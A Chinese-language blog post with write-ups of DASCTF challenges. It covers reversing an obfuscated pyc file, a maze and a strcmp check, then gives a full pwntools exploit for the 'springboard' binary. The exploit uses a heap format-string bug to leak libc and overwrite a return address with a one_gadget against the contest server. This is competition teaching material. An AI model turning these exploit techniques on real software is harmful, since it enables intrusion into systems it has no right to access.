

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>DASCTF安恒月赛(6th) - Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    
      
      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atom-one-dark.min.css">
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">

<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">

<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-06-27 22:27" pubdate>
        2020年6月27日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.2k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      36
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">DASCTF安恒月赛(6th)</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="DASCTF安恒月赛-6th"><a href="#DASCTF安恒月赛-6th" class="headerlink" title="DASCTF安恒月赛(6th)"></a>DASCTF安恒月赛(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pyc文件恢复"><a href="#pyCharm-pyc文件恢复" class="headerlink" title="pyCharm(pyc文件恢复)"></a>pyCharm(pyc文件恢复)</h3><p>这个题基本参考<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>来做的。</p>
<h4 id="加载pyc-co-code"><a href="#加载pyc-co-code" class="headerlink" title="加载pyc co_code"></a>加载<code>pyc co_code</code></h4><div class="hljs"><pre><code class="hljs undefined">In [1]: import dis,marshal

In [2]: f=open('1.pyc')

In [3]: f.read(4)
Out[3]: '<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>'

In [4]: f.read(4)
Out[4]: 'jv<span class="hljs-symbol">\x</span>e7^'

In [5]: code = marshal.load(f)

In [6]: code.co_consts
Out[6]:
(-1,
 None,
 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=',
 'Are u ready?',
 0,
 32,
 'a',
 '',
 'great!waht u input is the flag u wanna get.',
 'pity!')

In [7]: code.co_varnames
Out[7]: ()

In [8]: code.co_names
Out[8]:
('base64',
 'a',
 'raw_input',
 'flag',
 'b64encode',
 'c',
 'list',
 'd',
 'range',
 'i',
 'join',
 'ohh')

In [9]: code.co_code
Out[9]: "q<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00q<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>06d<span class="hljs-symbol">\x</span>ffd<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00l<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00x'<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00D]<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00c<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>19d<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>007<span class="hljs-symbol">\x</span>03&lt;qI<span class="hljs-symbol">\x</span>00Wd<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\n</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00k<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00r<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00GHn<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00GHd<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00S"</code></pre></div>

<h4 id="使用dis库对co-code进行反编译"><a href="#使用dis库对co-code进行反编译" class="headerlink" title="使用dis库对co_code进行反编译:"></a>使用dis库对<code>co_code</code>进行反编译:</h4><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">10</span>]: dis.dis(code.co_code)
          <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>
    &gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>
          <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)
          <span class="hljs-number">9</span> STOP_CODE
         <span class="hljs-number">10</span> STOP_CODE
         <span class="hljs-number">11</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)
         <span class="hljs-number">14</span> IMPORT_NAME         <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)
         <span class="hljs-number">17</span> STORE_NAME          <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)
         <span class="hljs-number">20</span> LOAD_CONST          <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)
         <span class="hljs-number">23</span> STORE_NAME          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)
         <span class="hljs-number">26</span> LOAD_NAME           <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)
         <span class="hljs-number">29</span> LOAD_CONST          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)
         <span class="hljs-number">32</span> CALL_FUNCTION       <span class="hljs-number">1</span>
         <span class="hljs-number">35</span> STORE_NAME          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)
         <span class="hljs-number">38</span> LOAD_NAME           <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)
         <span class="hljs-number">41</span> LOAD_ATTR           <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)
         <span class="hljs-number">44</span> LOAD_NAME           <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)
         <span class="hljs-number">47</span> CALL_FUNCTION       <span class="hljs-number">1</span>
         <span class="hljs-number">50</span> STORE_NAME          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)
         <span class="hljs-number">53</span> LOAD_NAME           <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)
         <span class="hljs-number">56</span> LOAD_NAME           <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)
         <span class="hljs-number">59</span> CALL_FUNCTION       <span class="hljs-number">1</span>
         <span class="hljs-number">62</span> STORE_NAME          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)
         <span class="hljs-number">65</span> SETUP_LOOP         <span class="hljs-number">39</span> (to <span class="hljs-number">107</span>)
         <span class="hljs-number">68</span> LOAD_NAME           <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)
         <span class="hljs-number">71</span> LOAD_CONST          <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)
         <span class="hljs-number">74</span> LOAD_CONST          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)
         <span class="hljs-number">77</span> CALL_FUNCTION       <span class="hljs-number">2</span>
         <span class="hljs-number">80</span> GET_ITER
         <span class="hljs-number">81</span> FOR_ITER           <span class="hljs-number">22</span> (to <span class="hljs-number">106</span>)
         <span class="hljs-number">84</span> STORE_NAME          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)
         <span class="hljs-number">87</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)
         <span class="hljs-number">90</span> LOAD_NAME           <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)
         <span class="hljs-number">93</span> DUP_TOPX            <span class="hljs-number">2</span>
         <span class="hljs-number">96</span> BINARY_SUBSCR
         <span class="hljs-number">97</span> LOAD_CONST          <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)
        <span class="hljs-number">100</span> INPLACE_ADD
        <span class="hljs-number">101</span> ROT_THREE
        <span class="hljs-number">102</span> STORE_SUBSCR
        <span class="hljs-number">103</span> JUMP_ABSOLUTE      <span class="hljs-number">73</span>
    &gt;&gt;  <span class="hljs-number">106</span> POP_BLOCK
    &gt;&gt;  <span class="hljs-number">107</span> LOAD_CONST          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)
        <span class="hljs-number">110</span> LOAD_ATTR          <span class="hljs-number">10</span> (<span class="hljs-number">10</span>)
        <span class="hljs-number">113</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)
        <span class="hljs-number">116</span> CALL_FUNCTION       <span class="hljs-number">1</span>
        <span class="hljs-number">119</span> STORE_NAME         <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)
        <span class="hljs-number">122</span> LOAD_NAME          <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)
        <span class="hljs-number">125</span> LOAD_NAME           <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)
        <span class="hljs-number">128</span> COMPARE_OP          <span class="hljs-number">2</span> (==)
        <span class="hljs-number">131</span> POP_JUMP_IF_FALSE   <span class="hljs-number">134</span>
    &gt;&gt;  <span class="hljs-number">134</span> LOAD_CONST          <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)
        <span class="hljs-number">137</span> PRINT_ITEM
        <span class="hljs-number">138</span> PRINT_NEWLINE
        <span class="hljs-number">139</span> JUMP_FORWARD        <span class="hljs-number">5</span> (to <span class="hljs-number">147</span>)
        <span class="hljs-number">142</span> LOAD_CONST          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)
        <span class="hljs-number">145</span> PRINT_ITEM
        <span class="hljs-number">146</span> PRINT_NEWLINE
    &gt;&gt;  <span class="hljs-number">147</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)
        <span class="hljs-number">150</span> RETURN_VALUE</code></pre></div>

<p>这里面需要注意的就是开头的：</p>
<div class="hljs"><pre><code class="hljs undefined">      <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>
&gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>
      <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)
      <span class="hljs-number">9</span> STOP_CODE
     <span class="hljs-number">10</span> STOP_CODE</code></pre></div>

<p>明显加入了混淆，怎么突然就停止了<code>STOP_CODE</code>。接着就是想办法去除这些混淆，和修正<code>co_code</code>长度，期望修改后的opcode首行为</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)
<span class="hljs-symbol">1 </span>LOAD_CONST <span class="hljs-number">1</span>(<span class="hljs-number">1</span>)</code></pre></div>


<p>其中这种二进制字节码对应的翻译结果：</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x64</span> 操作为LOAD_CONST，用法举例：LOAD_CONST <span class="hljs-number">1</span>        HEX: <span class="hljs-number">640100</span>

<span class="hljs-number">0x71</span> 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE <span class="hljs-number">14</span>                HEX: <span class="hljs-number">710e00</span>

<span class="hljs-number">0x65</span> 操作为LOAD_NAME，用法举例：LOAD_NAME <span class="hljs-number">1</span>                HEX: <span class="hljs-number">650100</span></code></pre></div>

<p>所以寻找：</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)</code></pre></div>

<p>即为寻找<code>HEX : 640000</code>这个作为混淆字段结束。<br>开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测：</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>JUMP_ABSOLUTE       <span class="hljs-number">3</span></code></pre></div>

<p>￼￼￼￼￼￼<br>￼￼￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p>
<p>那很明显混淆字段就是：</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" alt></p>
<p>然后用工具删除即可，其中0x97就是<code>co_code</code></p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">12</span>]: <span class="hljs-function"><span class="hljs-title">len</span>(<span class="hljs-variable">code</span>.co_code)</span>
<span class="hljs-variable">Out</span>[<span class="hljs-number">12</span>]: <span class="hljs-number">151</span>

<span class="hljs-variable"><span class="hljs-keyword">In</span></span> [<span class="hljs-number">13</span>]: <span class="hljs-function"><span class="hljs-title">hex</span>(<span class="hljs-number">151</span>)</span>
<span class="hljs-variable">Out</span>[<span class="hljs-number">13</span>]: <span class="hljs-string">'0x97'</span></code></pre></div>

<p>所以去除这8个字节的混淆代码，然后修改<code>co_code</code>长度为<code>0x8f</code>。</p>
<h4 id="还原后的pyc开头"><a href="#还原后的pyc开头" class="headerlink" title="还原后的pyc开头"></a>还原后的pyc开头</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/imrvPr.png" srcset="/img/loading.gif" alt></p>
<h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>反编译方法就多种多样了，可以在线什么的，我使用的<code>uncompyle6</code>.</p>
<div class="hljs"><pre><code class="hljs undefined">uncompyle6 -o <span class="hljs-number">1.</span>py <span class="hljs-number">1.</span>pyc</code></pre></div>

<div class="hljs"><pre><code class="hljs undefined"># uncompyle6 version <span class="hljs-number">3.7</span><span class="hljs-number">.1</span>
# Python bytecode <span class="hljs-number">2.7</span> (<span class="hljs-number">62211</span>)
# Decompiled <span class="hljs-keyword">from</span>: Python <span class="hljs-number">2.7</span><span class="hljs-number">.16</span> (<span class="hljs-keyword">default</span>, Feb <span class="hljs-number">29</span> <span class="hljs-number">2020</span>, <span class="hljs-number">01</span>:<span class="hljs-number">55</span>:<span class="hljs-number">37</span>)
# [GCC <span class="hljs-number">4.2</span><span class="hljs-number">.1</span> Compatible Apple LLVM <span class="hljs-number">11.0</span><span class="hljs-number">.3</span> (clang<span class="hljs-number">-1103.0</span><span class="hljs-number">.29</span><span class="hljs-number">.20</span>) (-macos10<span class="hljs-number">.15</span>-objc-
# Embedded file name: pyCharm.py
# Compiled at: <span class="hljs-number">2020</span><span class="hljs-number">-06</span><span class="hljs-number">-15</span> <span class="hljs-number">21</span>:<span class="hljs-number">23</span>:<span class="hljs-number">54</span>
<span class="hljs-keyword">import</span> base64
a = <span class="hljs-string">'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM='</span>
flag = raw_input(<span class="hljs-string">'Are u ready?'</span>)
c = base64.b64encode(flag)
d = list(c)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):
    d[i] += <span class="hljs-string">'a'</span>

ohh = (<span class="hljs-string">''</span>).join(d)
<span class="hljs-keyword">if</span> ohh == a:
    print <span class="hljs-string">'great!waht u input is the flag u wanna get.'</span>
<span class="hljs-keyword">else</span>:
    print <span class="hljs-string">'pity!'</span>%</code></pre></div>

<p>反编译后这题就十分简单了。</p>
<p>给的字符串把“a”，去除后解码base64即可。</p>
<h3 id="easy-maze"><a href="#easy-maze" class="headerlink" title="easy_maze"></a><code>easy_maze</code></h3><p>直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。<br>然后丢vscode。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Y7wdYy.png" srcset="/img/loading.gif" alt><br>直接路径就出来了。</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attribute">jkkjjhjjkjjkkkuukukkuuhhhuukkk</span></code></pre></div>

<p>Md5一下即可。</p>
<h3 id="T0p-Gear"><a href="#T0p-Gear" class="headerlink" title="T0p Gear"></a>T0p Gear</h3><p>题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在<code>Strcmp</code>。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="springboard"><a href="#springboard" class="headerlink" title="springboard"></a>springboard</h3><p>考点就是堆上的格式化字符串利用，挺简单的。</p>
<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p> 利用环境变量那条链，进行攻击<code>ret address</code>，修改为one gadget<br>给了8次漏洞利用机会，还是很容易实现的。其中<code>ret address</code>，为<code>__libc_start_main+xxx</code></p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> time
local_file  = <span class="hljs-string">'./springboard'</span>
local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>
remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>
context.log_level = <span class="hljs-string">'debug'</span>
debug = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> debug:
    io = process(local_file)
    libc = ELF(local_libc)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)
    libc = ELF(remote_libc)
elf = ELF(local_file)
<span class="hljs-comment"># libc = elf.libc</span>
context.arch = elf.arch
context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>
rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]
rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]
realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]
arae18 = <span class="hljs-number">0x3ebca0</span>
s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) 
sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)
sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)
sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)
r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))
uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))
info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))
itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>
    gdb.attach(io)
    pause()
sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"1"</span>)
sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"2"</span>)
sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"3"</span>)
sla(<span class="hljs-string">"input"</span>,<span class="hljs-string">"%13$pAAAA%11$p"</span>)
sleep(<span class="hljs-number">0.1</span>)
ru(<span class="hljs-string">"0x"</span>)
tag = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0xe0</span>
ru(<span class="hljs-string">"AAAA0x"</span>)
libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) <span class="hljs-number">-0x21b97</span>
info_addr(<span class="hljs-string">"libc_base"</span>,libc_base)
key1 = hex(tag)[<span class="hljs-number">-4</span>:]
print(key1)
payload = <span class="hljs-string">'%&#123;&#125;c%13$hn'</span>.format(int(key1,<span class="hljs-number">16</span>))
sla(<span class="hljs-string">"input"</span>,payload)
sleep(<span class="hljs-number">5</span>)
rec = rce18[<span class="hljs-number">1</span>] + libc_base
key2 = hex(rec)[<span class="hljs-number">-4</span>:]
print(key2)
payload = <span class="hljs-string">'%&#123;&#125;c%39$hn'</span>.format(int(key2,<span class="hljs-number">16</span>))
sla(<span class="hljs-string">"input"</span>,payload)
sleep(<span class="hljs-number">5</span>)
key3 = int(hex(tag)[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>) + <span class="hljs-number">2</span>
print(key3)
payload = <span class="hljs-string">'%&#123;&#125;c%13$hhn'</span>.format(key3)
sla(<span class="hljs-string">"input"</span>,payload)
sleep(<span class="hljs-number">5</span>)
key4 = hex(rec)[<span class="hljs-number">-6</span>:<span class="hljs-number">-4</span>]
print(key4)
payload = <span class="hljs-string">'%&#123;&#125;c%39$hhn'</span>.format(int(key4,<span class="hljs-number">16</span>))
sla(<span class="hljs-string">"input"</span>,payload)
itr()
<span class="hljs-comment"># 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push   r15)</span>
<span class="hljs-comment"># 0008| 0x7fffffffe2f8 --&gt; 0x55554780</span>
<span class="hljs-comment"># 0016| 0x7fffffffe300 --&gt; 0x555555756010 ("11111111aaaaaaaa1111111122222222\n")</span>
<span class="hljs-comment"># 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00</span>
<span class="hljs-comment"># 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push   r15)</span>
<span class="hljs-comment"># 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:       mov    edi,eax)</span>
<span class="hljs-comment"># 0048| 0x7fffffffe320 --&gt; 0x1</span>
<span class="hljs-comment"># 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a ("/media/psf/mypwn/ahys/6/springboard/springboard")</span>
<span class="hljs-comment"># 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0</span>
<span class="hljs-comment"># 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push   rbp)</span>
<span class="hljs-comment"># 0080| 0x7fffffffe340 --&gt; 0x0</span>
<span class="hljs-comment"># 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42</span>
<span class="hljs-comment"># 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor    ebp,ebp)</span>
<span class="hljs-comment"># 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1</span>
<span class="hljs-comment"># 0112| 0x7fffffffe360 --&gt; 0x0</span>
<span class="hljs-comment"># 0120| 0x7fffffffe368 --&gt; 0x0</span>
<span class="hljs-comment"># 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42</span>
<span class="hljs-comment"># 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42</span>
<span class="hljs-comment"># 0144| 0x7fffffffe380 --&gt; 0x0</span>
<span class="hljs-comment"># 0152| 0x7fffffffe388 --&gt; 0x0</span>
<span class="hljs-comment"># 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830</span></code></pre></div>

<h3 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h3><p>考点就是<code>IO_FILE</code>的相关知识了，是针对伪造 vtable 劫持程序流程。</p>
<p>这个题估计是参考<a href="https://xz.aliyun.com/t/7205" target="_blank" rel="noopener">https://xz.aliyun.com/t/7205</a>这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情）</p>
